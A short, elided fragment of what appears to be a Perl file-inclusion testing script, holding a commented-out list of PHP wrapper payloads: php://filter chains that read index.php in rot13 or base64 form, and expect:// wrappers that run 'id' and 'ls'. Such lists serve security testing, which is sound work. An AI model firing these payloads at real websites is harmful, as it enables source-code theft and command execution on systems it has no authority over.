...
#Filter files
# my @Filter_files = ('php://filter/read=string.rot13/resource=index.php',
...
# 					'php://filter/zlib.deflate/convert.base64-encode/resource=index',
# 					'expect://id',
# 					'expect://ls');
